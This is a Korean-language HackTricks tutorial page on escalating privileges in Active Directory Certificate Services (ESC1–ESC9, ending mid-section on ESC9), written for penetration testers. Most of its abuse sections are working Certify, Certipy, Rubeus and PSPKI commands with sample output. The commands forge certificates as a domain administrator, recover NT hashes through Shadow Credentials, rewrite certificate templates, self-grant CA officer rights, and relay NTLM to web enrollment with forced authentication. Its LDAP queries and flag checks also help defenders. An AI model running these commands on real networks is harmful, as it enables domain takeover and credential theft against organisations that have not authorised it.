# AD CS 도메인 승격

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로에서 영웅까지 AWS 해킹 배우기</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)에 가입하거나 [텔레그램 그룹](https://t.me/peass)에 가입하거나** **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 요령을 공유하려면 PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**이는 게시물의 승격 기술 섹션 요약입니다:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 잘못 구성된 인증서 템플릿 - ESC1

### 설명

### 잘못 구성된 인증서 템플릿 - ESC1 설명

* **Enterprise CA에 의해 낮은 권한을 가진 사용자에게 등록 권한이 부여됩니다.**
* **관리자 승인이 필요하지 않습니다.**
* **인증된 인원의 서명이 필요하지 않습니다.**
* **인증서 템플릿의 보안 기술서는 너무 허용적이어서 낮은 권한을 가진 사용자가 등록 권한을 얻을 수 있습니다.**
* **인증서 템플릿은 인증을 용이하게 하는 EKU(Extended Key Usage)를 정의하도록 구성되어 있습니다:**
* 클라이언트 인증 (OID 1.3.6.1.5.5.7.3.2), PKINIT 클라이언트 인증 (1.3.6.1.5.2.3.4), 스마트 카드 로그온 (OID 1.3.6.1.4.1.311.20.2.2), 임의의 용도 (OID 2.5.29.37.0) 또는 EKU가 없음 (SubCA)과 같은 확장 키 사용 (EKU) 식별자가 포함됩니다.
* **요청자가 인증서 서명 요청(CSR)에 subjectAltName을 포함할 수 있는 능력이 템플릿에서 허용됩니다:**
* 주체 대체 이름(SAN)이 인증서에 포함되어 있으면 Active Directory(AD)는 주체 대체 이름(SAN)을 확인하기 위해 인증서에서 우선시합니다. 이는 CSR에서 SAN을 지정함으로써 인증서를 요청하여 임의의 사용자(예: 도메인 관리자)로 위장할 수 있음을 의미합니다. 요청자가 SAN을 지정할 수 있는지 여부는 인증서 템플릿의 AD 개체에서 `mspki-certificate-name-flag` 속성을 통해 표시됩니다. 이 속성은 비트마스크이며 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그의 존재는 요청자가 SAN을 지정할 수 있도록 허용합니다.

{% hint style="danger" %}
설정된 구성은 낮은 권한을 가진 사용자가 선택한 SAN을 사용하여 인증서를 요청할 수 있도록 하므로 Kerberos 또는 SChannel을 통해 임의의 도메인 주체로 인증할 수 있습니다.
{% endhint %}

이 기능은 때때로 제품이나 배포 서비스에 의해 HTTPS 또는 호스트 인증서를 동적으로 생성하거나 이해 부족으로 인해 활성화된 경우가 있습니다.

이 옵션을 사용하여 인증서를 생성하면 기존 인증서 템플릿(예: `WebServer` 템플릿)이 복제되고 인증 OID를 포함하도록 수정될 때와는 달리 경고가 트리거됨을 주의해야 합니다.

### 남용

**취약한 인증서 템플릿을 찾으려면** 다음을 실행할 수 있습니다:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**이 취약점을 악용하여 관리자를 사칭**하기 위해 다음을 실행할 수 있습니다:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
그럼 생성된 **인증서를 `.pfx` 형식**으로 변환하고 다시 **Rubeus 또는 certipy를 사용하여 인증**할 수 있습니다:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 이진 파일 "Certreq.exe" 및 "Certutil.exe"를 사용하여 PFX를 생성할 수 있습니다: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest의 구성 스키마 내에서 인증서 템플릿을 열거할 수 있습니다. 특히, 승인이나 서명이 필요하지 않은 것들, 클라이언트 인증 또는 스마트 카드 로그온 EKU를 가지고 있으며 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 활성화된 것들은 다음 LDAP 쿼리를 실행하여 수행할 수 있습니다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 잘못 구성된 인증서 템플릿 - ESC2

### 설명

두 번째 악용 시나리오는 첫 번째와 다른 변형입니다:

1. 기업 CA에 의해 저급 권한을 가진 사용자에게 등록 권한이 부여됩니다.
2. 관리자 승인 요구 사항이 비활성화됩니다.
3. 승인된 서명 필요 사항이 생략됩니다.
4. 인증서 템플릿에 대한 지나치게 허용적인 보안 설명자가 낮은 권한을 가진 사용자에게 인증서 등록 권한을 부여합니다.
5. **인증서 템플릿은 Any Purpose EKU 또는 EKU가 없도록 정의됩니다.**

**Any Purpose EKU**는 인증서를 **클라이언트 인증, 서버 인증, 코드 서명 등을 포함한 모든 목적**으로 획득할 수 있게 합니다. **ESC3에 사용된 기술과 동일한 기술**을 사용하여 이 시나리오를 악용할 수 있습니다.

**EKU가 없는** 인증서는 하위 CA 인증서로 작동하며 **모든 목적**으로 악용될 수 있으며 **새 인증서에 서명하는 데 사용**될 수 있습니다. 따라서 공격자는 하위 CA 인증서를 활용하여 새 인증서에 임의의 EKU나 필드를 지정할 수 있습니다.

그러나 **도메인 인증**을 위해 생성된 새 인증서는 **`NTAuthCertificates`** 개체에 의해 신뢰되지 않는 경우 기본 설정입니다. 그럼에도 불구하고 공격자는 여전히 **임의의 EKU와 임의의 인증서 값**으로 새 인증서를 생성할 수 있습니다. 이러한 인증서는 잠재적으로 **코드 서명, 서버 인증 등과 같은 다양한 목적**으로 **악용**될 수 있으며 SAML, AD FS 또는 IPSec와 같은 네트워크의 다른 응용 프로그램에 중대한 영향을 미칠 수 있습니다.

AD Forest의 구성 스키마 내에서 이 시나리오와 일치하는 템플릿을 나열하려면 다음 LDAP 쿼리를 실행할 수 있습니다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 잘못 구성된 등록 에이전트 템플릿 - ESC3

### 설명

이 시나리오는 첫 번째와 두 번째와 유사하지만 **다른 EKU**(인증서 요청 에이전트)를 **남용**하고 **2개의 다른 템플릿**을 사용합니다(따라서 2개의 요구 사항 세트가 있음).

**인증서 요청 에이전트 EKU**(OID 1.3.6.1.4.1.311.20.2.1)인 Microsoft 문서에서 **Enrollment Agent**로 알려진 것은 주체가 **다른 사용자를 대신하여 인증서를 등록**할 수 있도록 합니다.

**"등록 에이전트"**는 이러한 **템플릿**에 등록하고 결과로 나온 **인증서를 다른 사용자를 대신하여 CSR에 공동 서명**합니다. 그런 다음 **공동 서명된 CSR**을 CA에 **보내어** "대신하여 등록"을 허용하는 **템플릿**에 등록하고 CA는 **"다른" 사용자에게 속한 인증서**로 응답합니다.

**요구 사항 1:**

* 기업 CA에 의해 낮은 권한을 가진 사용자에게 등록 권한이 부여됩니다.
* 관리자 승인 요구 사항이 생략됩니다.
* 승인된 서명 요구 사항이 없습니다.
* 인증서 템플릿의 보안 설명자가 지나치게 허용되어 낮은 권한을 가진 사용자에게 등록 권한이 부여됩니다.
* 인증서 템플릿에는 인증서 요청 에이전트 EKU가 포함되어 있어 다른 주체를 대신하여 다른 인증서 템플릿을 요청할 수 있습니다.

**요구 사항 2:**

* 기업 CA가 낮은 권한을 가진 사용자에게 등록 권한을 부여합니다.
* 관리자 승인이 우회됩니다.
* 템플릿의 스키마 버전은 1이거나 2를 초과하며 인증서 요청 에이전트 EKU를 필요로 하는 Application Policy Issuance Requirement를 지정합니다.
* 인증서 템플릿에 정의된 EKU는 도메인 인증을 허용합니다.
* CA에 대한 등록 에이전트의 제한이 적용되지 않습니다.

### 남용

이 시나리오를 남용하기 위해 [**Certify**](https://github.com/GhostPack/Certify) 또는 [**Certipy**](https://github.com/ly4k/Certipy)를 사용할 수 있습니다:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**사용자**들은 **등록 에이전트 인증서**를 **획득**할 수 있는 권한을 가지는, 등록 **에이전트**가 등록할 수 있는 템플릿, 그리고 등록 에이전트가 대행할 **계정**들은 기업 CA에 의해 제한될 수 있습니다. 이는 `certsrc.msc` **스냅인**을 열고, CA에 **마우스 오른쪽 클릭**하여 **속성**을 클릭한 다음 “Enrollment Agents” 탭으로 **이동**함으로써 달성됩니다.

그러나, CA의 **기본** 설정은 “등록 에이전트 제한 없음”으로 되어 있다는 것에 유의해야 합니다. 관리자가 등록 에이전트에 대한 제한을 활성화하면, “등록 에이전트 제한”으로 설정하더라도 기본 구성은 매우 허용적인 상태로 유지됩니다. 이는 **모든 사람**이 **모든 템플릿**에 대해 등록할 수 있도록 허용합니다.

## 취약한 인증서 템플릿 액세스 제어 - ESC4

### **설명**

**인증서 템플릿**의 **보안 설명자**는 템플릿과 관련된 특정 **AD 주체**들이 가지는 **권한**을 정의합니다.

**공격자**가 **템플릿을 변경**하고 **이전 섹션에서 설명한 취약한 구성**을 설정할 **필요 권한**을 가지고 있다면, 특권 상승이 용이해질 수 있습니다.

인증서 템플릿에 적용되는 주요 권한은 다음과 같습니다:

* **소유자:** 객체에 대한 암시적 제어를 부여하여 모든 속성을 수정할 수 있게 합니다.
* **전체 제어:** 객체에 대한 완전한 권한을 부여하여 모든 속성을 변경할 수 있게 합니다.
* **WriteOwner:** 객체의 소유자를 공격자가 제어하는 주체로 변경할 수 있게 합니다.
* **WriteDacl:** 액세스 제어를 조정하여 공격자에게 전체 제어를 부여할 수 있게 합니다.
* **WriteProperty:** 모든 객체 속성을 편집할 수 있게 합니다.

### 남용

이전과 같은 특권 상승의 예시:

<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

ESC4는 사용자가 인증서 템플릿에 대한 쓰기 권한을 가지는 경우를 가리킵니다. 이는 예를 들어 인증서 템플릿의 구성을 덮어쓰고 해당 템플릿을 ESC1에 취약하게 만들기 위해 남용될 수 있습니다.

위 경로에서 볼 수 있듯이, `JOHNPC`만 이러한 권한을 가지고 있지만, 우리 사용자 `JOHN`은 `JOHNPC`에 대한 새로운 `AddKeyCredentialLink` 엣지를 가지고 있습니다. 이 기술은 인증서와 관련이 있기 때문에, 흔히 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)로 알려진 이 공격을 구현했습니다. 여기에는 피해자의 NT 해시를 검색하기 위한 Certipy의 `shadow auto` 명령어의 간단한 미리보기가 있습니다.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**는 단일 명령어로 인증서 템플릿의 구성을 덮어쓸 수 있습니다. **기본 설정**으로 Certipy는 구성을 덮어쓰기하여 ESC1에 취약하게 만듭니다. 또한 우리의 공격 이후 구성을 **복원하는 데 유용한 이전 구성을 저장하는 `-save-old` 매개변수를 지정**할 수도 있습니다.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 취약한 PKI 객체 액세스 제어 - ESC5

### 설명

인증서 템플릿 및 인증서 기관을 넘어서는 여러 객체를 포함하는 ACL 기반 관계의 방대한 웹은 전체 AD CS 시스템의 보안에 영향을 미칠 수 있습니다. 보안에 상당한 영향을 미칠 수 있는 이러한 객체는 다음과 같습니다:

* CA 서버의 AD 컴퓨터 객체은 S4U2Self 또는 S4U2Proxy와 같은 메커니즘을 통해 침해를 당할 수 있습니다.
* CA 서버의 RPC/DCOM 서버.
* 특정 컨테이너 경로 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 내의 하위 AD 객체 또는 컨테이너. 이 경로에는 인증서 템플릿 컨테이너, 인증 기관 컨테이너, NTAuthCertificates 객체 및 Enrollment Services 컨테이너와 같은 컨테이너 및 객체가 포함됩니다.

PKI 시스템의 보안이 저 권한을 가진 공격자가 이러한 중요한 구성 요소 중 하나를 제어하는 데 성공한다면 위험에 노출될 수 있습니다.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 설명

[CQure Academy 게시물](https://cqureacademy.com/blog/enhanced-key-usage)에서 논의된 주제는 Microsoft에서 제시한 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그의 함의에도 영향을 미칩니다. 이 구성은 인증 기관(CA)에서 활성화되면 **사용자 정의 값**을 **주제 대체 이름**에 포함할 수 있게 해줍니다. 이는 Active Directory®에서 생성된 요청을 포함한 **모든 요청**에 대해 적용되며, 결과적으로 **침입자**가 도메인 **인증**을 위해 설정된 **모든 템플릿**을 통해 등록할 수 있게 합니다. 따라서 침입자는 도메인 관리자로 인증하거나 도메인 내 **다른 활성 엔티티**로 인증할 수 있는 인증서를 안전하게 획득할 수 있습니다.

**참고**: `certreq.exe`의 `-attrib "SAN:"` 인수를 통해 **대체 이름**을 **인증서 서명 요청**(CSR)에 추가하는 접근 방식(“이름 값 쌍”이라고 함)은 ESC1에서 SAN의 악용 전략과 대조를 이룹니다. 여기서 차이점은 **계정 정보가** 어떻게 캡슐화되는지에 있습니다—인증서 속성 내에, 확장이 아닌. 

### 남용

설정이 활성화되었는지 확인하려면 조직은 `certutil.exe`를 사용하여 다음 명령을 사용할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
이 작업은 본질적으로 **원격 레지스트리 액세스**를 사용하므로 대안적인 접근 방법은 다음과 같을 수 있습니다:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
도구인 [**Certify**](https://github.com/GhostPack/Certify)와 [**Certipy**](https://github.com/ly4k/Certipy)는 이 구성 오류를 감지하고 악용할 수 있습니다:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
다음 설정을 변경하려면 **도메인 관리자** 권한 또는 동등한 권한이 있는 경우 다음 명령을 모든 워크스테이션에서 실행할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
환경에서 이 구성을 비활성화하려면 다음과 같이 플래그를 제거할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
2022년 5월 보안 업데이트 이후에는 새로 발급된 **인증서**에 **보안 확장 기능**이 포함됩니다. 이 기능은 **요청자의 `objectSid` 속성**을 통합합니다. ESC1의 경우, 이 SID는 지정된 SAN에서 파생됩니다. 그러나 **ESC6**의 경우, SID는 **요청자의 `objectSid`**를 반영하며 SAN이 아닙니다.\
ESC6를 악용하기 위해서는 시스템이 **ESC10 (약한 인증서 매핑)**에 취약해야 합니다. 이는 **새로운 보안 확장 기능 대신 SAN을 우선시**합니다.
{% endhint %}

## 취약한 인증서 권한 제어 - ESC7

### 공격 1

#### 설명

인증서 권한 제어는 CA(인증 기관)에 대한 액세스 제어를 관리하는 권한 집합을 통해 유지됩니다. 이러한 권한은 `certsrv.msc`에 액세스하여 CA를 마우스 오른쪽 버튼으로 클릭한 다음 속성을 선택한 후 보안 탭으로 이동하여 볼 수 있습니다. 또한 PSPKI 모듈을 사용하여 다음과 같은 명령을 사용하여 권한을 열거할 수 있습니다:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
이는 "CA 관리자" 및 "인증서 관리자" 역할에 상응하는 주요 권한인 **`ManageCA`** 및 **`ManageCertificates`**에 대한 통찰을 제공합니다.

#### 남용

인증 기관에서 **`ManageCA`** 권한을 가지면 PSPKI를 사용하여 원격으로 설정을 조작할 수 있습니다. 이는 어떤 템플릿에서도 SAN 지정을 허용하는 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그를 토글하는 것을 포함하며, 이는 도메인 상승의 중요한 측면입니다.

이 프로세스를 간소화하는 것은 PSPKI의 **Enable-PolicyModuleFlag** cmdlet을 사용하여 직접 GUI 상호작용 없이 수정을 허용합니다.

**`ManageCertificates`** 권한 소유는 보류 중인 요청을 승인하여 "CA 인증서 관리자 승인" 보호장치를 우회하는 데 효과적입니다.

**Certify** 및 **PSPKI** 모듈의 조합을 사용하여 인증서를 요청, 승인 및 다운로드할 수 있습니다:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 공격 2

#### 설명

{% hint style="warning" %}
이전 공격에서는 **`Manage CA`** 권한을 사용하여 **EDITF\_ATTRIBUTESUBJECTALTNAME2** 플래그를 활성화하여 **ESC6 공격**을 수행했지만, 이는 CA 서비스(`CertSvc`)가 다시 시작될 때까지는 어떤 효과도 없습니다. 사용자가 `Manage CA` 액세스 권한을 가지고 있을 때 사용자는 또한 **서비스를 다시 시작할 수 있습니다**. 그러나 사용자가 원격으로 서비스를 다시 시작할 수 있는 것은 아닙니다. 더욱이 대부분의 패치된 환경에서는 2022년 5월 보안 업데이트로 인해 **ESC6가 기본적으로 작동하지 않을 수 있습니다**.
{% endhint %}

따라서 다른 공격이 여기에 제시됩니다.

전제 조건:

* **`ManageCA` 권한만**
* **`Manage Certificates`** 권한 (**`ManageCA`**에서 부여 가능)
* 인증서 템플릿 **`SubCA`**가 **활성화**되어 있어야 함 (**`ManageCA`**에서 활성화 가능)

이 기술은 `Manage CA` 및 `Manage Certificates` 액세스 권한을 가진 사용자가 **인증서 요청 실패**를 발행할 수 있다는 사실에 의존합니다. **`SubCA`** 인증서 템플릿은 **ESC1에 취약**하지만 **관리자만** 템플릿에 등록할 수 있습니다. 따라서 **사용자**는 **`SubCA`**에 등록을 요청할 수 있지만 **거부**될 것이며, 그 후 **관리자에 의해 발급될 것**입니다.

#### 남용

새로운 관리자로 사용자를 추가하여 **`Manage Certificates`** 액세스 권한을 **자신에게 부여**할 수 있습니다.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 템플릿은 `-enable-template` 매개변수를 사용하여 CA에서 **활성화**할 수 있습니다. 기본적으로 `SubCA` 템플릿은 활성화되어 있습니다.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
만약 이 공격을 위한 전제 조건을 충족했다면, **`SubCA` 템플릿을 기반으로 인증서를 요청**하는 것으로 시작할 수 있습니다.

**이 요청은 거부**될 것이지만, 우리는 개인 키를 저장하고 요청 ID를 메모해 둘 것입니다.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` 및 `Manage Certificates`**를 사용하여 `ca` 명령 및 `-issue-request <request ID>` 매개변수로 **실패한 인증서** 요청을 발급할 수 있습니다.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
그리고 마지막으로, `req` 명령어와 `-retrieve <request ID>` 매개변수를 사용하여 **발급된 인증서를 검색**할 수 있습니다.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 설명

{% hint style="info" %}
**AD CS가 설치된 환경**에서는, 적어도 하나의 **인증서 템플릿이 발행되어 있고 도메인 컴퓨터 등록 및 클라이언트 인증을 허용하는** 존재하는 **웹 등록 엔드포인트가 취약**한 경우, **스풀러 서비스가 활성화된 모든 컴퓨터가 공격자에 의해 침해될 수 있는 가능성**이 있습니다!
{% endhint %}

AD CS에서는 여러 **HTTP 기반 등록 방법**이 지원되며, 관리자가 설치할 수 있는 추가 서버 역할을 통해 이용할 수 있습니다. 이러한 HTTP 기반 인증서 등록을 위한 인터페이스는 **NTLM 릴레이 공격**에 취약합니다. **공격자는 침해된 컴퓨터에서 인바운드 NTLM을 통해 인증하는 모든 AD 계정을 가장할 수 있습니다**. 피해자 계정을 가장하는 동안, 공격자는 이러한 웹 인터페이스에 액세스하여 **`User` 또는 `Machine` 인증서 템플릿을 사용하여 클라이언트 인증서를 요청**할 수 있습니다.

* **웹 등록 인터페이스**(http://<caserver>/certsrv/에서 사용 가능한 오래된 ASP 애플리케이션)는 기본적으로 HTTP만 지원하며, NTLM 릴레이 공격에 대한 보호를 제공하지 않습니다. 또한, 인증 HTTP 헤더를 통해 명시적으로 NTLM 인증만 허용하므로 Kerberos와 같은 더 안전한 인증 방법을 사용할 수 없습니다.
* **인증서 등록 서비스**(CES), **인증서 등록 정책**(CEP) 웹 서비스 및 **네트워크 장치 등록 서비스**(NDES)는 기본적으로 인증 HTTP 헤더를 통해 네고시에이트 인증을 지원합니다. 네고시에이트 인증은 Kerberos와 **NTLM을 모두 지원**하며, 공격자가 릴레이 공격 중 NTLM으로 **다운그레이드**할 수 있습니다. 이러한 웹 서비스는 기본적으로 HTTPS를 지원하지만, HTTPS만으로는 NTLM 릴레이 공격으로부터 보호받을 수 없습니다. HTTPS 서비스의 NTLM 릴레이 공격으로부터 보호는 HTTPS를 채널 바인딩과 결합할 때에만 가능합니다. 안타깝게도, AD CS는 채널 바인딩을 위해 필요한 IIS의 확장된 인증 보호를 활성화하지 않습니다.

NTLM 릴레이 공격의 **일반적인 문제점**은 **NTLM 세션의 짧은 기간**과 **공격자가 NTLM 서명을 필요로 하는 서비스와 상호 작용할 수 없는** 점입니다.

그러나 이 제한은 NTLM 릴레이 공격을 통해 사용자를 위한 인증서를 획들할하여 극복됩니다. 인증서의 유효 기간이 세션의 기간을 규정하며, 인증서는 **NTLM 서명을 필요로 하는 서비스에서 사용**할 수 있습니다. 훔친 인증서를 사용하는 방법에 대한 지침은 다음을 참조하십시오:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM 릴레이 공격의 또 다른 제한은 **공격자가 제어하는 컴퓨터가 피해자 계정에 의해 인증**되어야 한다는 것입니다. 공격자는 이 인증을 기다리거나 강제로 시도할 수 있습니다:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **악용**

[**Certify**](https://github.com/GhostPack/Certify)의 `cas`는 **활성화된 HTTP AD CS 엔드포인트를 열거**합니다:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 속성은 기업용 인증 기관(CAs)가 인증서 등록 서비스(CES) 엔드포인트를 저장하는 데 사용됩니다. 이러한 엔드포인트는 **Certutil.exe** 도구를 활용하여 구문 분석하고 나열할 수 있습니다:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

#### Certify를 악용
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy)을(를) 이용한 남용

인증서 요청은 Certipy에 의해 기본적으로 `$`로 끝나는 계정 이름에 따라 `Machine` 또는 `User` 템플릿을 기반으로 합니다. 대체 템플릿의 지정은 `-template` 매개변수를 사용하여 달성할 수 있습니다.

[PetitPotam](https://github.com/ly4k/PetitPotam)과 같은 기술을 사용하여 강제 인증을 수행할 수 있습니다. 도메인 컨트롤러를 다룰 때는 `-template DomainController`의 지정이 필요합니다.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 보안 확장 없음 - ESC9 <a href="#id-5485" id="id-5485"></a>

### 설명

새 값 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`)은 **`msPKI-Enrollment-Flag`**에 대한 ESC9로 참조되며, 인증서에 **새 `szOID_NTDS_CA_SECURITY_EXT` 보안 확장을 포함하는 것을 방지**합니다. 이 플래그는 `StrongCertificateBindingEnforcement`가 `1`로 설정된 경우 (기본 설정)와 대조적으로 `2`로 설정된 경우에 중요해집니다. ESC9의 부재는 요구 사항을 변경하지 않기 때문에, Kerberos 또는 Schannel을 위한 더 약한 인증서 매핑이 악용될 수 있는 경우 (ESC10과 같은)에 중요성이 높아집니다.

이 플래그 설정이 중요해지는 조건은 다음과 같습니다:

